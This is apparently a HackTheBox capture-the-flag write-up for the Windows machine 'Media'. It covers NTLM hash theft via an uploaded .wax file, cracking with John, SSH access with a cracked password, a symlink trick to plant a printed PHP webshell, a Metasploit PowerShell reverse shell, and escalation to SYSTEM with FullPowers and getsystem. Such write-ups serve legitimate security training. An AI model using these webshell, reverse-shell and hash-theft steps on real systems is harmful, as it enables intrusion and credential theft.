# [HackTheBox - Media](https://app.hackthebox.com/machines/Media)
![45875114e37755b090f67430a777c14d.png](/resources/45875114e37755b090f67430a777c14d.png)
## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access with ntlm_theft for user credential to SSH access](#initial-access-with-ntlm_theft-for-user-credential-to-ssh-access)
- [Privilege Escalation with to SYSTEM with Webshell](#privilege-escalation-with-to-system-with-webshell)
  - [Webshell to Local Service](#webshell-to-local-service)
  - [Local Service to SYSTEM with Potato](#local-service-to-system-with-potato)

***
## Abstract
Media is a vulnlab machine imported to HackTheBox as a medium Windows box. I started with network enumeration with nmap, revealing this machine is running SSH, a website on port 80 and RDP. 

Web enumeration reveals that I can upload any of media file type to let the user in the server review which I used wax file generated from ntlm_theft to force authentication from the machine to my machine and retrieve plaintext pass word of enox user via password cracking.

I used enox user credential to gain foothold on the machine via SSH and then I read the source code of the website which reveals the upload path of the files that could not be fetched which I created a symlink to abuse it and upload an aspx webshell to get a shell as Local Service.

Local Service is running under restricted token which I used FullPowers to recover default privilege of local service account including SeImpersonatePrivilege which I used meterpreter to abuse it and finally get a shell with SYSTEM and root the box.

## Enumeration
I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine is running SSH, website and RDP.

![c2eb88c96f89c75fdc46c0e3f8c25313.png](/resources/c2eb88c96f89c75fdc46c0e3f8c25313.png)

I rerun nmap scan again but this time with `-sCV` flag for service enumeration and nmap script engine but it does not reveal much so I will have to dig into the website to gather more information.

![4fb5842617610ef4e1f8f01501e918e4.png](/resources/4fb5842617610ef4e1f8f01501e918e4.png)

Upon browsing the website, I use Wappalyzer to detect the techstack and it reveals that the box is Windows Server, and the website is using PHP which hosting it with Apache which is weird because we would expect Windows Server to host website using IIS.

![3186c1c62e3014aa5ff9bc9459ccff7d.png](/resources/3186c1c62e3014aa5ff9bc9459ccff7d.png)

After keep exploring the site, I can see that I can upload any file that compatible with Windows Media Player to let the team analyze it so there is a bot on the server that will run probably any file we upload with Windows Media Player.

![90bfece346bd7ccf267f1b1823bf1c47.png](/resources/90bfece346bd7ccf267f1b1823bf1c47.png)

## Initial Access with ntlm_theft for user credential to SSH access
Since I know that there is a bot on the server that will open a file with Windows Media Player than I will use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to create files for NTLMv2 callback/NTLMSSP authentication.
```
python ntlm_theft.py -g all -s 10.10.14.24 -f vdo
```
![f540fc4b90112920cd3da1499e7fb38a.png](/resources/f540fc4b90112920cd3da1499e7fb38a.png)

I upload the `wax` payload here since it can be used by Windows Media player and now what left is to setup a responder to capture NTLM hash.

![a89b9f69292164e73ecb4dcb545ca744.png](/resources/a89b9f69292164e73ecb4dcb545ca744.png)
![72228c905619381b5f1dde50ddcf1ff6.png](/resources/72228c905619381b5f1dde50ddcf1ff6.png)

After setup the responder, I recieved NTLMv2 hash of enox user right away.
```
sudo responder -I tun0
```
![6b4f4b4ac52eb5e2895630cd8060afe6.png](/resources/6b4f4b4ac52eb5e2895630cd8060afe6.png)

Using John The Ripper to crack NTLMv2 hash and now I have credential that can be used for initial access.
```
john --wordlist=/usr/share/wordlists/rockyou.txt enox_hash 
```
![7402c2a0840779bcb5c652f8c03f9a49.png](/resources/7402c2a0840779bcb5c652f8c03f9a49.png)

Checking if I can connect to target using SSH with NetExec and it is confirm that I can get a foothold on this machine via SSH
```
nxc ssh 10.129.214.161 -u enox -p '1234virus@'
```
![4a42a7bd1220643f89df5e5479bc268e.png](/resources/4a42a7bd1220643f89df5e5479bc268e.png)

Using SSH to get the foothold and loot user flag
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" enox@$IP
```
![029245363fc2b1271c49a1524b9f239c.png](/resources/029245363fc2b1271c49a1524b9f239c.png)
![724437fb6afdf858d3a2a17a7f516504.png](/resources/724437fb6afdf858d3a2a17a7f516504.png)

## Privilege Escalation with to SYSTEM with Webshell
### Webshell to Local Service
I start enumerating the webroot first which there is a high chance that this website is running on other user context which I can use that for privilege escalation. which I can not upload any php webshell here but I should be able to read `index.php` to understand the behaviour of this website.

![5007916098d7c2ac2dedb37e21dedb8c.png](/resources/5007916098d7c2ac2dedb37e21dedb8c.png)

Upon reading the content of `index.php`, it reveals that there is no input validation on this website so I can upload anything on the website but to prevent potential webshell utilization, all files will be uploaded to `C:/Windows/Tasks/Uploads/` inside the specific folder generated from firstname, lastname and email specify in the form which if I don't specify anything while uploading a file then it should be uploaded to the same folder everytime.

![2a744447be20cc1e8327f189f61a64ef.png](/resources/2a744447be20cc1e8327f189f61a64ef.png)

I tried upload multiple files here and all files are uploaded in the same folder.

![198d346ebd4e79aaf86b2fad2867f3d4.png](/resources/198d346ebd4e79aaf86b2fad2867f3d4.png)

To actually exploit this, I will create symbolic link from the uploaded folder to webroot which I should be able to utilize PHP reverse shell that I will upload with this symlink.

First, I'll remove all files and folders to remove any conflict when I created a symlink.
```
del d41d8cd98f00b204e9800998ecf8427e
rmdir d41d8cd98f00b204e9800998ecf8427e
```
![bec1183e102bae4c649691c513c28fef.png](/resources/bec1183e102bae4c649691c513c28fef.png)

Now I create a symlink from `C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e` folder to webroot folder.

```
cmd /c mklink /J C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e C:\xampp\htdocs
```
![ade7f43981026ff03621b8714cdd7d68.png](/resources/ade7f43981026ff03621b8714cdd7d68.png)

Next, I upload the simple webshell here with the upload functionaility of the website.
```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
![9065ab50957a488127b9b90f692a46d2.png](/resources/9065ab50957a488127b9b90f692a46d2.png)
![8439ee02a2984b9082f02b06069be781.png](/resources/8439ee02a2984b9082f02b06069be781.png)

On the webroot, I can see that my webshell was really uploaded to webroot as expected.

![3a5450368c46035e06859580f1138293.png](/resources/3a5450368c46035e06859580f1138293.png)

I test my webshell by simply running `whoami` command to confirm which user is running the website which we can see that local service user is hosting the website.
```
curl http://10.129.214.161/commandshell.php?cmd=whoami
```
![df3fb30e6c6ca6f7b60f5c71095e09fb.png](/resources/df3fb30e6c6ca6f7b60f5c71095e09fb.png)

And beside that, it was hosted with restricted privielge as well.
![d465e2b662af6f0bcc6e9ce87ab32da2.png](/resources/d465e2b662af6f0bcc6e9ce87ab32da2.png)

Now to be able to get a reverse shell, I use web delivery module of metasploit framework to create powershell reverse shell payload.

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 443
run
```
![43a8f4e4da9502058503ba55748b282d.png](/resources/43a8f4e4da9502058503ba55748b282d.png)

Then I encode the payload with "URL encode" recipe from Cyberchef and now I get a shell as Local Service.
```
curl 'http://10.129.214.161/commandshell.php?cmd=powershell.exe%20-nop%20-w%20hidden%20-e%20<...SNIP...>'
```
![66e4e83908dfe91b354b2ad9b9cdabb7.png](/resources/66e4e83908dfe91b354b2ad9b9cdabb7.png)
![fe2ecc134e9d18427973a2bbf6ce8d1d.png](/resources/fe2ecc134e9d18427973a2bbf6ce8d1d.png)

Normally, Local Service account would have more privilege than this including SeAssignPrimaryTokenPrivilege and SeImpersonatePrivilege so I will use [FullPowers](https://github.com/itm4n/FullPowers) to restore all privileges of Local Service which will be used to get SYSTEM privilege later.

![32ffcc50fb35d423eb6a241525b85c9f.png](/resources/32ffcc50fb35d423eb6a241525b85c9f.png)

I use the same payload hosting with web delivery module to execute reverse shell payload as Local Service with full privilege and now I have both dangerous privilege ready for potato attack.
```
FullPowers.exe -c "powershell.exe -nop -w hidden -e <...SNIP...>"
```
![c76845bb74a5ccac406814e0267fb5b2.png](/resources/c76845bb74a5ccac406814e0267fb5b2.png)

### Local Service to SYSTEM with Potato
Since I use meterpreter as my reverse shell payload then I can use a single command to become SYSTEM like this
```
getsystem
```
![fe87b8681452132d781666de8dfd4dbc.png](/resources/fe87b8681452132d781666de8dfd4dbc.png)

Now I loot the root flag and root the box :D

![816da963d3635223439edf5393d1f654.png](/resources/816da963d3635223439edf5393d1f654.png)

![b31d30259afc1a81e4396392ccd3ec98.png](/resources/b31d30259afc1a81e4396392ccd3ec98.png)
https://labs.hackthebox.com/achievement/machine/1438364/718
***